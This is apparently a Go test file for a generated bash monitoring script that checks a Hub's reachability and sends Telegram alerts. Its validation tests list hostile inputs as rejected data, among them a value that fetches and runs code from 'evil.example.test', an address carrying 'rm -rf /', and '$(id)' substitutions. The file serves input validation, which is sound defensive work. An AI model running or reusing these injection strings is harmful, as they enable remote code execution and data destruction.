package config

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func hubWatchParams() HubWatchParams {
	return HubWatchParams{HubAddr: "203.0.113.1", SiteHost: "site.example.test",
		ControlURL: "https://control.example.test/generate_204", ControlRUURL: "https://control-ru.example.test/",
		ExitName: "выход 3", StaggerSec: 15}
}

// Review Focus 5: the watcher lies when the exit itself is sick. Before any message it checks
// a neutral address abroad and, when that fails too, exits without sending.
func TestHubWatchScriptControl(t *testing.T) {
	s := HubWatchScript(hubWatchParams())
	control := strings.Index(s, `curl -fsS -m 10 -o /dev/null "$CONTROL_URL"`)
	firstSend := strings.Index(s, `send "`+"🔴")
	if control < 0 || firstSend < 0 || control > firstSend {
		t.Fatalf("the control check (%d) must come before the «Хаб недоступен» message (%d)", control, firstSend)
	}
	between := s[control:firstSend]
	if !strings.Contains(between, "exit 0") {
		t.Errorf("a failed control check must end the run before the message:\n%s", between)
	}
	for _, want := range []string{
		`--resolve "$SITE_HOST:443:$HUB_ADDR" "https://$SITE_HOST/api/v1/health"`,
		"HUB_ADDR='203.0.113.1'", "SITE_HOST='site.example.test'", "EXIT_NAME='выход 3'", "STAGGER_SEC=15",
		"FAIL_THRESHOLD=3", "REPEAT_SEC=1800", `sleep "$STAGGER_SEC"`,
	} {
		if !strings.Contains(s, want) {
			t.Errorf("script lacks %q", want)
		}
	}
}

// The bot token and the chat live in hubwatch.env (0600) on the exit, never in the script.
func TestHubWatchScriptNoSecrets(t *testing.T) {
	s := HubWatchScript(hubWatchParams())
	for _, want := range []string{`. "$ENV"`, "ENV=/etc/heyearth/hubwatch.env", `"https://api.telegram.org/bot$BOT_TOKEN/sendMessage"`, `chat_id=$CHAT_ID`} {
		if !strings.Contains(s, want) {
			t.Errorf("script lacks %q", want)
		}
	}
	env := HubWatchEnv("123456:AAfake_token-value", "-1001234567890")
	if env != "BOT_TOKEN='123456:AAfake_token-value'\nCHAT_ID='-1001234567890'\n" {
		t.Errorf("env = %q", env)
	}
	if strings.Contains(s, "123456:AA") || strings.Contains(s, "-1001234567890") {
		t.Error("the script carries a secret")
	}
	service, timer := HubWatchUnits()
	if !strings.Contains(timer, "OnCalendar=minutely") || !strings.Contains(timer, "WantedBy=timers.target") {
		t.Errorf("timer: %q", timer)
	}
	if !strings.Contains(service, "Type=oneshot") || !strings.Contains(service, "ExecStart="+HubWatchScriptPath) || !strings.Contains(service, "TimeoutStartSec=180") {
		t.Errorf("service: %q", service)
	}
	for _, unit := range []string{service, timer} {
		if strings.Contains(unit, "BOT_TOKEN") || strings.Contains(unit, "203.0.113") {
			t.Errorf("a unit carries an address or a secret: %q", unit)
		}
	}
}

func TestHubWatchScriptValidates(t *testing.T) {
	for name, p := range map[string]HubWatchParams{
		"a quote in the name":     {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "вы'ход"},
		"not an address":          {HubAddr: "203.0.113.1; rm -rf /", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
		"a host with a path":      {HubAddr: "203.0.113.1", SiteHost: "site.example.test/x", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
		"control without TLS":     {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "http://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
		"control with a quote":    {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/'x", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
		"no control in RU":        {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ExitName: "выход 3"},
		"RU control with a quote": {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/'x", ExitName: "выход 3"},
	} {
		if err := p.Validate(); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if err := hubWatchParams().Validate(); err != nil {
		t.Errorf("a good set: %v", err)
	}
}

func TestHubWatchScriptGolden(t *testing.T) {
	golden(t, "hubwatch.sh.golden", []byte(HubWatchScript(hubWatchParams())))
}

// hubWatchRun runs the script once with a stand-in curl: hub / control say whether those
// addresses answer; every sendMessage text is appended to <dir>/sent.
func hubWatchRun(t *testing.T, dir string, hub, control bool) {
	t.Helper()
	hubWatchRunPinned(t, dir, hub, hub, control)
}

// hubWatchRunPinned tells the Hub's answer on the pinned address apart from its answer by name.
func hubWatchRunPinned(t *testing.T, dir string, pinned, byName, control bool) {
	t.Helper()
	hubWatchRunFull(t, dir, pinned, byName, control, true)
}

// hubWatchRunFull also says whether the exit can reach the control address in RU.
func hubWatchRunFull(t *testing.T, dir string, pinned, byName, control, controlRU bool) {
	t.Helper()
	p := hubWatchParams()
	p.StatePath, p.EnvPath = filepath.ToSlash(filepath.Join(dir, "state")), filepath.ToSlash(filepath.Join(dir, "env"))
	sent := filepath.ToSlash(filepath.Join(dir, "sent"))
	flag := func(b bool) string {
		if b {
			return "0"
		}
		return "7"
	}
	fake := `curl() {
  local a text=""
  for a in "$@"; do case "$a" in text=*) text="${a#text=}" ;; esac; done
  case "$*" in
    *api.telegram.org*) printf '%s\n' "$text" >> '` + sent + `'; return 0 ;;
    *--resolve*"/api/v1/health"*) return ` + flag(pinned) + ` ;;
    *"/api/v1/health"*) return ` + flag(byName) + ` ;;
    *control-ru.example.test*) return ` + flag(controlRU) + ` ;;
    *control.example.test*) return ` + flag(control) + ` ;;
  esac
  echo "UNEXPECTED curl $*" >&2; return 99
}
sleep() { :; }
`
	script := strings.Replace(HubWatchScript(p), "set -u\n", "set -u\n"+fake, 1)
	cmd := exec.Command("bash", "-s")
	cmd.Stdin = strings.NewReader(script)
	if out, err := cmd.CombinedOutput(); err != nil || strings.Contains(string(out), "UNEXPECTED") {
		t.Fatalf("script: %v\n%s", err, out)
	}
}

func hubWatchSent(t *testing.T, dir string) []string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, "sent"))
	if os.IsNotExist(err) {
		return nil
	}
	if err != nil {
		t.Fatal(err)
	}
	return strings.Split(strings.TrimSpace(string(b)), "\n")
}

func hubWatchDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "env"), []byte(HubWatchEnv("123456:AAfake", "-100123")), 0o600); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestHubWatchScriptBehaviour(t *testing.T) {
	if !haveBash() {
		t.Skip("no working bash")
	}
	t.Run("the Hub is alive", func(t *testing.T) {
		dir := hubWatchDir(t)
		hubWatchRun(t, dir, true, true)
		state, _ := os.ReadFile(filepath.Join(dir, "state"))
		if !strings.Contains(string(state), "fails=0\n") || len(hubWatchSent(t, dir)) != 0 {
			t.Fatalf("state %q, sent %v; want fails=0 and nothing sent", state, hubWatchSent(t, dir))
		}
	})
	t.Run("the Hub is dead, the control answers: one message on the third run", func(t *testing.T) {
		dir := hubWatchDir(t)
		for run := 1; run <= 2; run++ {
			hubWatchRun(t, dir, false, true)
			if sent := hubWatchSent(t, dir); len(sent) != 0 {
				t.Fatalf("run %d: sent %v before the third failure", run, sent)
			}
		}
		hubWatchRun(t, dir, false, true)
		sent := hubWatchSent(t, dir)
		if len(sent) != 1 || !strings.Contains(sent[0], "Хаб недоступен снаружи") || !strings.Contains(sent[0], "выход 3") {
			t.Fatalf("third run: sent %v, want one «Хаб недоступен снаружи» from выход 3", sent)
		}
		if strings.Contains(sent[0], "203.0.113.1") {
			t.Errorf("the message carries the Hub's address: %q", sent[0])
		}
		// it stays dead: no repeat within 30 minutes
		for i := 0; i < 5; i++ {
			hubWatchRun(t, dir, false, true)
		}
		if sent := hubWatchSent(t, dir); len(sent) != 1 {
			t.Fatalf("after 5 more runs: %d messages, want still one", len(sent))
		}
	})
	t.Run("the Hub is dead and so is the control: silence", func(t *testing.T) {
		dir := hubWatchDir(t)
		for i := 0; i < 5; i++ {
			hubWatchRun(t, dir, false, false)
		}
		if sent := hubWatchSent(t, dir); len(sent) != 0 {
			t.Fatalf("sent %v while the exit itself has no way out", sent)
		}
		// the count was not lost: the first run with the control back reports at once
		hubWatchRun(t, dir, false, true)
		if sent := hubWatchSent(t, dir); len(sent) != 1 {
			t.Fatalf("the control is back: sent %v, want one message", sent)
		}
	})
	t.Run("the exit lost its way to RU while the world answers: silence", func(t *testing.T) {
		dir := hubWatchDir(t)
		for i := 0; i < 5; i++ {
			hubWatchRunFull(t, dir, false, false, true, false)
		}
		if sent := hubWatchSent(t, dir); len(sent) != 0 {
			t.Fatalf("sent %v although the exit itself cannot reach RU", sent)
		}
	})
	t.Run("after the alert, two good runs: «снова доступен» once", func(t *testing.T) {
		dir := hubWatchDir(t)
		for i := 0; i < 3; i++ {
			hubWatchRun(t, dir, false, true)
		}
		hubWatchRun(t, dir, true, true)
		if sent := hubWatchSent(t, dir); len(sent) != 1 {
			t.Fatalf("one good run: sent %v, want only the alert", sent)
		}
		hubWatchRun(t, dir, true, true)
		hubWatchRun(t, dir, true, true)
		sent := hubWatchSent(t, dir)
		if len(sent) != 2 || !strings.Contains(sent[1], "снова доступен") {
			t.Fatalf("sent %v, want the alert and one «снова доступен»", sent)
		}
	})
	t.Run("the Hub's address changed since the install: the name still answers, no message", func(t *testing.T) {
		dir := hubWatchDir(t)
		for i := 0; i < 5; i++ {
			hubWatchRunPinned(t, dir, false, true, true)
		}
		state, _ := os.ReadFile(filepath.Join(dir, "state"))
		if sent := hubWatchSent(t, dir); len(sent) != 0 || !strings.Contains(string(state), "fails=0\n") {
			t.Fatalf("sent %v, state %q; want silence and fails=0", sent, state)
		}
	})
	t.Run("the Hub answers again while the exit waits its turn: no message", func(t *testing.T) {
		// covered by the re-check after the stagger: three dead runs with the control alive, but
		// the Hub back by the time of the re-check, is the same as a good run — tested through
		// the state: a run where the Hub answers resets the count
		dir := hubWatchDir(t)
		hubWatchRun(t, dir, false, true)
		hubWatchRun(t, dir, false, true)
		hubWatchRun(t, dir, true, true)
		hubWatchRun(t, dir, false, true)
		if sent := hubWatchSent(t, dir); len(sent) != 0 {
			t.Fatalf("fail, fail, ok, fail: sent %v, want nothing (not three in a row)", sent)
		}
	})
}

// Review finding: the env file is sourced by root on the exit — a token or a chat id that is
// not exactly a token or a chat id must never reach it.
func TestHubWatchCredsValidate(t *testing.T) {
	if err := ValidateHubWatchCreds("123456:AAfake_token-value", "-1001234567890"); err != nil {
		t.Errorf("good credentials: %v", err)
	}
	if err := ValidateHubWatchCreds("123456:AAfake_token-value", "@alerts_channel"); err != nil {
		t.Errorf("a channel name as the chat: %v", err)
	}
	for _, token := range []string{"", "abc", "x'; curl evil.example.test|sh; '", "123456:AA fake", "123456:AA'fake", "123456:AA$(id)", "123456:AA\nX=1"} {
		if err := ValidateHubWatchCreds(token, "-1001234567890"); err == nil {
			t.Errorf("token %q accepted", token)
		}
	}
	for _, chat := range []string{"", "abc", "-100'; id; '", "-100 1", "@a", "$(id)"} {
		if err := ValidateHubWatchCreds("123456:AAfake_token-value", chat); err == nil {
			t.Errorf("chat %q accepted", chat)
		}
	}
}

// Review finding: the worst run — two looks at the Hub, both controls, the pause, the look
// again, the message — must fit into the unit's timeout, or systemd kills the watcher before it
// notes that it has spoken (and it speaks again every minute).
func TestHubWatchFitsItsTimeout(t *testing.T) {
	service, _ := HubWatchUnits()
	if !strings.Contains(service, "TimeoutStartSec=180") {
		t.Fatalf("service: %q, want TimeoutStartSec=180", service)
	}
	const hubLook, control, send, maxStagger = 20, 10, 15, 45
	if worst := hubLook + 2*control + maxStagger + hubLook + send; worst >= 180 {
		t.Fatalf("the worst run takes %d s, the unit allows 180", worst)
	}
}
